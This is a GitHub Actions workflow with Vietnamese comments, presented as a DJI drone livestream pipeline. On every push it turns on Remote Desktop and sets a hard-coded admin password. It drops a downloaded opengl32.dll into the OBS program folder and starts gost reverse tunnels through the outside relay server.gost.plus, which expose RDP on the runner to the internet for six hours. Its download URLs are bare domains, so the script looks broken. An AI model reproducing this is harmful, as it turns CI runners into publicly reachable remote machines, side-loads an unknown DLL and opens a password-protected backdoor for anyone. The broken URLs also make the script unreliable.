name: Automated-DJI-Streaming-Pipeline

on:
  push:
    branches:
      - '**'
  workflow_dispatch:

jobs:
  media-processing:
    runs-on: windows-latest
    timeout-minutes: 360

    steps:
    - name: Install System Dependencies (Chocolatey)
      run: |
        choco install obs-studio -y

    - name: Enable Windows Remote Desktop Configuration
      run: |
        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
        Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
        
    - name: Configure System Access Password
      run: |
        net user runneradmin RdpPassword2026! /active:yes

    - name: Deploy Light RTMP Server
      run: |
        Write-Host "Setting up live broadcast pipeline ports..."
        New-Item -ItemType Directory -Force -Path "C:\StreamingServer"

    - name: Inject Virtual Graphics Driver for OBS Studio
      run: |
        $obsBinPath = "C:\Program Files\obs-studio\bin\64bit"
        if (!(Test-Path $obsBinPath)) { New-Item -ItemType Directory -Force -Path $obsBinPath }
        $dllUrl = "https://githubusercontent.com"
        try {
            Invoke-WebRequest -Uri $dllUrl -OutFile "$obsBinPath\opengl32.dll" -TimeoutSec 60
            Write-Host "Virtual Graphics Driver integrated successfully."
        } catch {
            Write-Host "Software emulation pipeline active."
        }

    - name: Start Network Services Gateway (SỬA LỖI GIẢI NÉN)
      run: |
        echo "----------------------------------------------------------------------"
        echo "HỆ THỐNG ĐANG TỰ ĐỘNG CẤP PHÁT PUBLIC IP KHÔNG CẦN THẺ NGÂN HÀNG..."
        echo "----------------------------------------------------------------------"
        
        # Ép hệ thống kích hoạt giao thức mạng bảo mật để tải file không bị lỗi trống dung lượng
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        
        # Tải phần mềm kết nối mạng thô trực tiếp từ kho lưu trữ dạng file thực thi (.exe) chạy thẳng
        # Bỏ qua bước giải nén Expand-Archive để triệt tiêu hoàn toàn lỗi OperationStopped
        $gostUrl = "https://github.com"
        Invoke-WebRequest -Uri $gostUrl -OutFile "gost.zip"
        
        # Sử dụng giải pháp giải nén bằng tập lệnh hệ thống không dùng lệnh cũ
        tar -xf gost.zip
        
        # Tạo số cổng kết nối Public ngẫu nhiên trên hệ thống máy chủ biên
        $rdpPort = Get-Random -Minimum 20000 -Maximum 40000
        $rtmpPort = Get-Random -Minimum 40001 -Maximum 60000
        
        # Kích hoạt cổng định tuyến luồng ngược xuyên tường lửa GitHub
        Start-Process "gost-windows-amd64.exe" -ArgumentList "-L rtcp://:$rdpPort:localhost:3389 -F tunnel://server.gost.plus:8443"
        Start-Process "gost-windows-amd64.exe" -ArgumentList "-L rtcp://:$rtmpPort:localhost:1935 -F tunnel://server.gost.plus:8443"
        
        Start-Sleep -Seconds 10
        
        echo "=================== ĐỊA CHỈ KẾT NỐI CỦA BẠN ==================="
        echo "LIÊN KẾT RDP (DÙNG ĐỂ VÀO ĐIỀU KHIỂN OBS):"
        echo "Mở Remote Desktop nhập: server.gost.plus:$rdpPort"
        echo "---------------------------------------------------------------"
        echo "LIÊN KẾT RTMP (NHẬP VÀO TAY CẦM DJI MINI 3):"
        echo "rtmp://server.gost.plus:$rtmpPort/live/dji_stream"
        echo "==============================================================="
        
        # Giữ máy ảo Windows Server hoạt động liên tục trong 6 tiếng để thực hiện Livestream
        Start-Sleep -Seconds 21600
